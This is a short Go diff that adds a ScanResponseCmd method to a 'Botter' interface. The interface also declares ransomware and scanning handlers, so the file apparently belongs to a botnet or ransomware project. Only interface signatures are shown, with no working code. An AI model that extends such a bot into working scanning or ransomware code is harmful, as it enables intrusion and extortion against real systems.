@@ -9,6 +9,7 @@ import (
 //Botter is
 type Botter interface {
 	RansomCompleteCmd()
+	ScanResponseCmd(addrs []string) error
 
 	HandleScan()
 	HandleRansomware()
